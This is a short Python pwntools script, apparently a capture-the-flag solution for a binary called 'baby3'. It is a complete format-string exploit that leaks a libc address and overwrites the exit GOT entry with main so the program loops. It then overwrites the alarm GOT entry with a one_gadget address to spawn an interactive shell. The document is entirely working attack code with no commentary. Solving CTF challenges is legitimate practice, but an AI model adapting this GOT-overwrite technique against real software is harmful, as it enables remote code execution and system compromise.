from pwn import *
from fmtstr64 import *
 
def main():
    r = process("./baby3")
    #r = remote("baby-01.pwn.beer",10003)
    libc = ELF("./libc.so.6",checksec=False)
    exit_got = 0x000000602048
    main = 0x000000000040076F
    alarm_got = 0x000000602030
 
    p = "%25$pZZZ"
    p += fmtstr64_payload(7,{exit_got:main},numb_written=17)
    r.sendlineafter("input: ",p)
    libc_start_x = int(r.recvuntil("Z")[:-1],16)
    libc_base = libc_start_x - libc.symbols['__libc_start_main'] - 0xe7
    one_gadget = libc_base + 0x4f322
    print(hex(libc_start_x))
    print(hex(libc_base))
 
    p = fmtstr64_payload(6,{alarm_got:one_gadget})
    p += "\x00" * (128 - len(p))
    r.sendline(p)
    r.interactive()
 
 
if __name__ == "__main__":
    main()